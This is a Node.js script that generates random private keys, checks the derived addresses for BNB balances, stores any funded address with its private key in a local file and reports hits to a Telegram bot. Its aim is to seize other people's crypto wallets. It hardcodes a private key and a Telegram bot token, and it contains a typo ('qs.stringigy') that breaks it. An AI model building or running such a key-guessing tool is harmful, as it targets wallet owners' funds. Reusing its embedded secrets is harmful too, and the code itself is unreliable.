
const dotenv = require("dotenv");
const fs = require("fs");
const { randomBytes } = require('crypto');
const PRIVATE_KEY='f28c24b23f4268d2aaa2addaa52573c64798190bc5cb0bf25135632f8cb5580c'  // Random wallet for makingn calls
const axios = require('axios');
const qs = require('qs');
              
let found = 0
let checkedThisSession = 0
let startTime = new Date()
// not sure what this does, but IT IS REQUIRED to do stuff.
const result = dotenv.config();
if (result.error) {
  // throw result.error;
}

// setup wallet stuff and default account needed to make some calls and preps for success Uses PRIVATE_KEY as ann initial test. then rocks and rolls

const Web3 = require("web3");
const w = new Web3(process.env.BSC_RPC);

let wallet = w.eth.accounts.wallet.add(
  w.eth.accounts.privateKeyToAccount(PRIVATE_KEY)
);
w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
  PRIVATE_KEY
).address;



// Used to increment Private Key
const setWallet = async () => {
 
  if(wallet.index > 10000) {
    wallet = w.eth.accounts.wallet.clear()
  }

    const privKey = randomBytes(32)
    const pKeyString = privKey.toString('hex')
    wallet = w.eth.accounts.wallet.add(
      w.eth.accounts.privateKeyToAccount(pKeyString)
    );
    checkedThisSession++

}


const checkBalance = async (amount) => {
  const wToCheck = wallet
  w.eth.getBalance(wToCheck.address).then(function (b) {    
    let balance = Web3.utils.fromWei(b, "ether");
    if (balance > parseFloat(amount)) {
      found++
      console.log(`Found Ya!: ${balance} BNB`);
      console.log(wToCheck, found)
      saveRound(wToCheck, balance)
      var message = qs.stringigy(`Address: ${wToCheck.address} : Balance: ${balance}`)
      sendNotification(message);
    }
  });
  
};


const sendNotification = async (message) => {
  var url = `https://api.telegram.org/bot6213624319:AAHJTY7IGktO6kNcy_c-g6_7xWCi6Wfpik0/sendMessage?chat_id=-1001794956683&text=${message}`
  axios.get(url);
}
const logInfo = async() => {
  var currentTime = new Date()
  var elapsed = currentTime - startTime;
  var elapsedSeconds = Math.round(elapsed / 1000);
  var rate = Math.round(checkedThisSession / elapsedSeconds)
  console.log(`Found: ${found}   Checked: ${checkedThisSession}  Elapsed: ${elapsedSeconds} seconds   Rate: ${rate}/s`)
}


const saveRound = async (cWallet, amount) => {
  const roundData = [
    {
      address: cWallet.address.toString(),
      pKey: cWallet.privateKey.toString(),
      value: amount.toString(),
    },
  ];
  let path = `./history/WithBalance.json`
  
    if (fs.existsSync(path)) {
        try {
          const fileData = JSON.parse(fs.readFileSync(path))
          fileData.push(roundData)
          fs.writeFileSync(path, JSON.stringify(fileData, null, 2));
        } catch (e) {
          fs.writeFileSync(path, JSON.stringify([roundData], null, 2));
        }
       
    } else {
      fs.writeFileSync(path, JSON.stringify([roundData], null, 2));
    }
  
};



module.exports = {
  checkBalance,
  setWallet,
  logInfo,
  sendNotification
};
